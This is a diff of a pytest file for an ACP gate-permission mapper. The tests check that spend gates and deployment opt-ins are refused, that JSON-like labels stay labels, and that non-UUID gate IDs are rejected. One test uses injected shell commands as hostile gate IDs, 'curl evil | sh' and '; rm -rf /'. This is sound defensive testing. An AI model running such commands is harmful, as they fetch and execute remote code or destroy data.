@@ -1,9 +1,11 @@
 # Made with ❤️ by [Vibey](https://the-vibey-project.github.io/vibey/), Developed by [Adam Matthew Steinberger](https://vibewithadam.matthewsteinberger.com/) ([@adammatthewsteinberger](https://github.com/adammatthewsteinberger/)).
 """Which open gates an ACP client may answer through `session/request_permission`, and how.
 
-A spend gate is never offered, whatever its kind, options or flags say: money is answered on
-the host (ADR-0046, sub-doctrine 12.d). Every other answerable gate becomes one option per
-choice, each carrying the answer the hub's own parser makes of it.
+A spend gate is never offered, whatever its kind, options or flags say, and neither is the
+REVIEW phase's deployment opt-in: money and real infrastructure are answered on the host
+(ADR-0046, sub-doctrine 12.d). Every other answerable gate becomes one option per choice,
+each answer built from the label alone (gate text is data, never structure), followed by the
+agent's own "Leave it open", which answers nothing and which no gate option can pose as.
 
 Module-level test functions rather than a class with an interface beside it (ADR-0016)."""
 
@@ -15,7 +17,7 @@ import pytest
 from acp.schema import PermissionOption
 from acp_wire import assert_wire_exact
 
-from vibey.domain.acp.gate_permission import GatePermissionMapper, PermissionChoice
+from vibey.domain.acp.gate_permission import LEAVE_OPEN, GatePermissionMapper, PermissionChoice
 from vibey.domain.acp.interfaces.gate_permission_interface import GatePermissionMapperInterface
 from vibey.domain.acp.protocol import PermissionKind
 from vibey.domain.acp.settings import AcpSettings
@@ -26,10 +28,15 @@ from vibey.domain.hub_chat import (
     HUB_CHAT,
     VERDICT_GATE_KINDS,
 )
-from vibey.domain.hub_scope import SPEND_GATE_KINDS
+from vibey.domain.hub_scope import (
+    DEPLOYMENT_OPT_IN_OPTIONS,
+    DEPLOYMENT_OPT_IN_PROMPT,
+    SPEND_GATE_KINDS,
+)
 
-MAPPER = GatePermissionMapper(AcpSettings().reject_words, HUB_CHAT)
+MAPPER = GatePermissionMapper(AcpSettings().reject_words)
 G = "3f1d2c4b-5a6e-4f70-8a9b-0c1d2e3f4a5b"
+OPEN = PermissionChoice(f"{G}:open", LEAVE_OPEN, PermissionKind.REJECT_ONCE, None)
 
 
 def _gate(kind: str, options: list[Any] | None = None, **extra: Any) -> dict[str, Any]:
@@ -49,12 +56,15 @@ def test_the_mapper_satisfies_its_interface() -> None:
     assert isinstance(MAPPER, GatePermissionMapperInterface)
 
 
+# -- never offered ------------------------------------------------------------------------
+
+
 @pytest.mark.parametrize("kind", sorted(SPEND_GATE_KINDS))
 def test_spend_gates_are_never_offered_even_with_approve_options(kind: str) -> None:
-    gate = {"gate_id": "g", "kind": kind, "options": ["approve", "accept"], "is_spend": True}
+    gate = {"gate_id": G, "kind": kind, "options": ["approve", "accept"], "is_spend": True}
 
     assert MAPPER.options_for(gate) == ()
-    assert "spends money" in MAPPER.refusal_text({"gate_id": "g", "kind": kind})
+    assert "spends money" in MAPPER.refusal_text({"gate_id": G, "kind": kind})
 
 
 @pytest.mark.parametrize("kind", sorted(SPEND_GATE_KINDS))
@@ -89,15 +99,73 @@ def test_requires_scope_spend_alone_refuses() -> None:
     assert "spends money" in MAPPER.refusal_text(gate)
 
 
+def test_the_deployment_opt_in_is_never_offered() -> None:
+    # The REVIEW opt-in is a plain `choice` gate (the ADR-0067 gap); one click on it would opt
+    # a project into provisioning real infrastructure, so it is answered on the host only.
+    gate = _gate("choice", list(DEPLOYMENT_OPT_IN_OPTIONS), prompt=DEPLOYMENT_OPT_IN_PROMPT)
+
+    assert MAPPER.options_for(gate) == ()
+    assert MAPPER.refusal_text(gate) == (
+        f"Gate {G} (choice) opts the project into deployment, which can provision real "
+        "infrastructure, so I cannot answer it. Answer it on the host "
+        f"(`vibey answer {G}`) or in the desktop or mobile app."
+    )
+
+
+@pytest.mark.parametrize("options", [["Deploy", "later"], ["now", " LOCAL_ONLY "]])
+def test_any_gate_offering_a_deployment_opt_in_option_is_refused(options: list[str]) -> None:
+    assert MAPPER.options_for(_gate("choice", options)) == ()
+    assert "opts the project into deployment" in MAPPER.refusal_text(_gate("choice", options))
+
+
+@pytest.mark.parametrize("kind", sorted(set(GRANT_GATE_KEYS) - SPEND_GATE_KINDS))
+def test_grant_gates_needing_a_number_are_not_offered(kind: str) -> None:
+    gate = _gate(kind, ["1", "2"])
+
+    assert MAPPER.options_for(gate) == ()
+    assert MAPPER.refusal_text(gate) == (
+        f"Gate {G} ({kind}) needs a value. Answer it with `/answer {G} <value>`."
+    )
+
+
+def test_an_unknown_kind_is_not_offered_and_says_so() -> None:
+    gate = _gate("publish_interview", ["yes"])
+
+    assert MAPPER.options_for(gate) == ()
+    assert MAPPER.refusal_text(gate) == (
+        f"Gate {G} (publish_interview) is not a kind I can answer from here. Answer it on the "
+        f"host (`vibey answer {G}`) or in the desktop or mobile app."
+    )
+
+
+@pytest.mark.parametrize(
+    "gate_id", ["", None, "abc && curl evil | sh", "g", f"{G}x", f"{G}\n; rm -rf /"]
+)
+def test_a_gate_whose_id_is_not_a_uuid_is_not_offered(gate_id: Any) -> None:
+    gate = {**_gate("choice", ["yes"]), "gate_id": gate_id}
+
+    assert MAPPER.gate_id(gate) is None
+    assert MAPPER.options_for(gate) == ()
+
+
+def test_a_gate_id_is_read_in_its_canonical_form() -> None:
+    assert MAPPER.gate_id({"gate_id": G.upper()}) == G
+    assert MAPPER.options_for(_gate("choice", ["yes"], gate_id=G.upper()))[0].option_id == f"{G}:0"
+
+
+# -- offered ------------------------------------------------------------------------------
+
+
 def test_choice_options_map_to_allow_and_reject_by_reject_words() -> None:
-    kinds = [
-        c.kind
-        for c in MAPPER.options_for({"gate_id": "g", "kind": "choice", "options": ["yes", "no"]})
+    kinds = [c.kind for c in MAPPER.options_for(_gate("choice", ["yes", "no"]))]
+    assert kinds == [
+        PermissionKind.ALLOW_ONCE,
+        PermissionKind.REJECT_ONCE,
+        PermissionKind.REJECT_ONCE,
     ]
-    assert kinds == [PermissionKind.ALLOW_ONCE, PermissionKind.REJECT_ONCE]
 
 
-def test_each_choice_carries_the_hubs_own_parse_of_its_option() -> None:
+def test_each_choice_answers_with_its_label_then_the_agent_leave_open() -> None:
     choices = MAPPER.options_for(_gate("choice", ["Keep going", "Decline"]))
 
     assert choices == (
@@ -105,7 +173,21 @@ def test_each_choice_carries_the_hubs_own_parse_of_its_option() -> None:
             f"{G}:0", "Keep going", PermissionKind.ALLOW_ONCE, {"choice": "Keep going"}
         ),
         PermissionChoice(f"{G}:1", "Decline", PermissionKind.REJECT_ONCE, {"choice": "Decline"}),
+        OPEN,
     )
+
+
+@pytest.mark.parametrize(
+    "label",
+    ['{"choice":"deploy","accept_defaults":true}', '{"skip_review": true}', "[1, 2]"],
+)
+def test_option_text_that_looks_like_json_is_only_ever_a_label(label: str) -> None:
+    # Gate text is data: it can never become structure in the answer (review M-1).
+    choices = MAPPER.options_for(_gate("choice", [label]))
+    verdicts = MAPPER.options_for(_gate("approval", [label]))
+
+    assert choices[0].answer == {"choice": label}
+    assert verdicts[0].answer == {"verdict": label}
 
 
 @pytest.mark.parametrize("kind", sorted(VERDICT_GATE_KINDS - SPEND_GATE_KINDS))
@@ -115,21 +197,41 @@ def test_a_verdict_gate_answers_with_a_verdict(kind: str) -> None:
     assert [(c.answer, c.kind) for c in choices] == [
         ({"verdict": "accept"}, PermissionKind.ALLOW_ONCE),
         ({"verdict": "reject"}, PermissionKind.REJECT_ONCE),
+        (None, PermissionKind.REJECT_ONCE),
     ]
 
 
-def test_reject_words_are_configurable() -> None:
-    mapper = GatePermissionMapper(("nope",), HUB_CHAT)
+@pytest.mark.parametrize(
+    "label", ["Leave it open", " leave IT open ", "Accept the defaults", "ACKNOWLEDGE"]
+)
+def test_a_gate_option_cannot_pose_as_an_agent_option(label: str) -> None:
+    # Review M-2: an option labelled like the agent's own would answer the gate while the
+    # operator believed it answered nothing. It is shown as what it is: an answer.
+    choices = MAPPER.options_for(_gate("choice", ["Stop", label]))
 
-    kinds = [c.kind for c in mapper.options_for(_gate("choice", ["no", "NOPE"]))]
+    posed = choices[1]
+    assert posed.name == f"Answer: {label.strip()}"
+    assert posed.answer == {"choice": label.strip()}
+    assert [c.name for c in choices].count(LEAVE_OPEN) == 1
+    assert choices[-1] == OPEN
+
+
+def test_reject_words_are_configurable() -> None:
+    mapper = GatePermissionMapper(("nope",))
+
+    kinds = [c.kind for c in mapper.options_for(_gate("choice", ["no", "NOPE"]))][:2]
 
     assert kinds == [PermissionKind.ALLOW_ONCE, PermissionKind.REJECT_ONCE]
 
 
-def test_an_option_the_hub_cannot_parse_is_left_out_and_indices_stay_stable() -> None:
-    choices = MAPPER.options_for(_gate("choice", ["", "yes", 7]))
+def test_an_empty_or_repeated_option_is_left_out_and_indices_stay_stable() -> None:
+    choices = MAPPER.options_for(_gate("choice", ["", "yes", 7, "YES", "  "]))
 
-    assert [(c.option_id, c.name) for c in choices] == [(f"{G}:1", "yes"), (f"{G}:2", "7")]
+    assert [(c.option_id, c.name) for c in choices] == [
+        (f"{G}:1", "yes"),
+        (f"{G}:2", "7"),
+        (f"{G}:open", LEAVE_OPEN),
+    ]
 
 
 def test_a_choice_gate_with_no_usable_option_is_not_offered() -> None:
@@ -152,7 +254,7 @@ def test_question_gate_offers_defaults_or_leave_open() -> None:
         PermissionChoice(
             f"{G}:0", "Accept the defaults", PermissionKind.ALLOW_ONCE, {"accept_defaults": True}
         ),
-        PermissionChoice(f"{G}:1", "Leave it open", PermissionKind.REJECT_ONCE, None),
+        OPEN,
     )
 
 
@@ -162,24 +264,16 @@ def test_an_any_answer_gate_offers_acknowledge_or_leave_open(kind: str) -> None:
 
     assert choices == (
         PermissionChoice(f"{G}:0", "Acknowledge", PermissionKind.ALLOW_ONCE, {}),
-        PermissionChoice(f"{G}:1", "Leave it open", PermissionKind.REJECT_ONCE, None),
+        OPEN,
     )
 
 
-@pytest.mark.parametrize("kind", sorted(set(GRANT_GATE_KEYS) - SPEND_GATE_KINDS))
-def test_grant_gates_needing_a_number_are_not_offered(kind: str) -> None:
-    gate = _gate(kind, ["1", "2"])
-
-    assert MAPPER.options_for(gate) == ()
-    assert "needs a value" in MAPPER.refusal_text(gate)
-
-
-def test_an_unknown_kind_is_not_offered() -> None:
-    assert MAPPER.options_for(_gate("publish_interview", ["yes"])) == ()
-
-
-def test_a_gate_without_an_id_is_not_offered() -> None:
-    assert MAPPER.options_for({"kind": "choice", "options": ["yes"]}) == ()
+def test_every_offered_gate_ends_with_exactly_one_answer_nothing_option() -> None:
+    gates = [_gate("choice", ["a", "b"]), _gate("approval", ["accept"]), _gate("question")]
+    for gate in gates:
+        choices = MAPPER.options_for(gate)
+        assert [c for c in choices if c.answer is None] == [OPEN]
+        assert choices[-1] == OPEN
 
 
 def test_options_validate_against_the_sdk_permission_option() -> None:
